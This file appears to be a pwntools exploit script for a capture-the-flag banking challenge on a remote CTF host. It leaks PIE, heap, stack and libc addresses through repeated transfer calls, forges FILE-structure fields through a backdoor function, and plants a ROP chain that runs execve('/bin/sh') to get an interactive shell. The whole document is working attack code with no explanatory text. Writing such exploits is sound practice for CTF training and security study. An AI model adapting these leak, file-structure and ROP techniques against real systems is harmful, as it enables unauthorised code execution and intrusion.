#!/usr/bin/env python
from pwn import *
sys.tracebacklimit = 4
context(endian = "little", encoding='ascii') # arch='amd64'
context.terminal = ["tmux", "splitw", "-h"]
const = constants
os.chdir('./dist')
exe_path = '%s_patched' % ('./chal')
exe = context.binary = ELF(exe_path, checksec=False)
libc_path = ('./glibc/libc.so.6')
libc = ELF(libc_path, checksec=False)
gdbscript = """
    #source /home/hacker/.gef.py
    #gef config context.layout ''
    # -- exe
    #break *transfer+312
    #continue
    # disp/3i $pc
"""
host, port = ('nc bank.ctf.theromanxpl0.it 7010').split()[-2:]
start_time = time.time()

def assert_page_aligned(addr): return addr & 0xfff == 0, hex(addr)
def u64(b): return packing.u64(b.ljust(8, b'\0'))

def gdb_pause(interactive=False):
    if args.REMOTE: return
    d = r.clean(0.1)
    input(f'gdb {r.pid}')
    if interactive: r.interactive()
    r.unrecv(d)

def conn(argv=[]):
    if args.REMOTE:
        r = remote(host, int(port))
    elif args.GDB:
        r = gdb.debug(argv or [exe_path], exe=exe_path, gdbscript=gdbscript)
    else:
        r = process(argv or [exe_path])
    return r

def cmd(n): r.sendlineafter(prompt, str(n))

# open_account
def alloc(msg=None):
    cmd(2)
    if msg:
        data = r.clean(0.1)
        assert not data, hexdump(data)
        r.send(msg)
    r.recvuntil('IBAN is ')
    name = r.recvline()[:-1]
    return name
    pass

# close_account
def free(name):
    cmd(3)
    r.sendafter('IBAN:\n', name)
    assert len(name) < 32

def deposit(name, amt: int):
    cmd(4)
    r.sendafter('IBAN:\n', name)
    r.sendlineafter('deposit?\n', str(amt))

# amt: None for leak
def transer(sender, recver, amt: int) -> bool:
    cmd(5)
    r.sendafter('IBAN:\n', sender)
    r.sendafter('IBAN:\n', recver)
    r.sendlineafter('transfer?\n', str(amt) if amt else '-')
    line = r.recvline()
    return b'successfully' in line
    pass

# *(u64*)prevchain=chain, (u64*)((u64)chain + 0xb8) = prevchain
def backdoor(chain, prevchain, lock, fileno=3):
    cmd(6)
    r.sendlineafter("identity:\n", hex(exe.sym.secret_backdoor))
    part_fakefile = flat({
        0x8: chain,
        0x10: fileno,
        0x28: lock,
        0x58: prevchain,
        0x60: -1, # mode
    }, filler=b'\0')
    r.sendlineafter('question...\n', part_fakefile)
    pass

U64_MAX = 2**64 - 1

prompt = 'Exit\n\n> '
r = conn()
def main(nstep = 1):
    global r
    info(f'-- step {nstep}: leaking'); nstep += 1
    with context.silent:
        a, b, c = [alloc() for x in range(3)]
    pie_leak = (exe.sym.deposit+226) & 0xfff
    with log.progress('leak pie'), context.silent:
        deposit(a, U64_MAX)
        assert transer(a, b, None)
        for i in range(47, -1 + 3, -1):
            if transer(b, c, 1 << i):
                pie_leak |= 1<<i
        pass
    info(f'LEAK: {pie_leak = :#x}')
    pie_base = exe.address = pie_leak - (exe.sym.deposit+226)
    assert_page_aligned(pie_base)

    with context.silent:
        accounts = [a, b, c] + [alloc() for x in range(32 - 3)]
    d, e, f = accounts[3:][:3]
    heap_leak = 0
    with log.progress('leak heap'), context.silent:
        deposit(d, U64_MAX)
        free(accounts[-1])
        assert transer(d, e, None)

        for i in range(47, -1 + 1, -1):
            if transer(e, f, 1 << i):
                heap_leak |= 1<<i
        pass
    info(f'LEAK: {heap_leak = :#x}')
    fp_rand_lock_addr = heap_leak - 0x1670
    info(f'CALC: {fp_rand_lock_addr = :#x}')

    g, h, j = accounts[6:][:3]
    stack_leak = 0
    with log.progress('leak stack'), context.silent:
        deposit(g, U64_MAX)
        accounts[-1] = alloc()
        assert transer(g, h, None)
        for i in range(47, -1, -1):
            if transer(h, j, 1 << i):
                stack_leak |= 1<<i
        pass
    info(f'LEAK: {stack_leak = :#x}')
    fclose_rbp_ptr = stack_leak - 0x168
    info(f'CALC: {fclose_rbp_ptr = :#x}')

    k,l,m = accounts[9:][:3]
    libc_leak = (libc.sym.puts+474) & 0xfff
    with log.progress('leak libc'), context.silent:
        deposit(k, U64_MAX)
        cmd(8); r.unrecv(r.clean(0.2)[-20:]) # puts("invalid") clobber libc address
        assert transer(k, l, None)

        for i in range(47, -1 + 3, -1):
            if transer(l, m, 1 << i):
                libc_leak |= 1<<i
        pass
    info(f'LEAK: {libc_leak = :#x}')
    libc_base = libc.address = libc_leak - (libc.sym.puts+474)
    assert_page_aligned(libc_base)

    info(f'-- step {nstep}: write ropchains from stdin'); nstep += 1
    with log.progress('set fp_rand->_fileno=0 to prevent reading more from urandom'):
        fake_fp_rand_lock_addr = exe.bss(0x400)
        backdoor(0, 0, fake_fp_rand_lock_addr, 0)

    info('fp_rand buffers 0x1000 bytes from urandom')
    nread = (32 + 1) * 29
    nremains = 0x1000 - nread
    info(f'we read {nread:#x} bytes, remaining {nremains:#x} bytes')

    n = accounts[-1]
    with log.progress('draining fp_rand->buffer'):#, context.silent:
        for i in range(nremains // 29):
            free(n)
            n = alloc()
        pass

    nremains %= 29
    info(f'\tremaining {nremains:#x} bytes')

    rop = ROP(libc)
    rop.execve(next(libc.search('/bin/sh')), 0, 0)
    rop.exit(0)
    msg = flat({
        0x900: bytes(rop)
    }, filler=b'8').ljust(0x1000, b'8')

    free(accounts[0])
    n = alloc(msg)
    fp_rand_read_base = heap_leak - 0x1550 # fp_rand->buffer
    fake_stack = fp_rand_read_base + 0x900
    info('restore fd=3 to not close(stdin) accidentally')
    backdoor(fake_stack - 8, fclose_rbp_ptr, fp_rand_lock_addr, 3)
    # gdb_pause()
    cmd(7)
    pass

try:
    main()
    log.success(f'duration: {time.time() - start_time}')
    # r.sendline('id; cat flag;')
    r.interactive()
except Exception as exc:
    raise exc
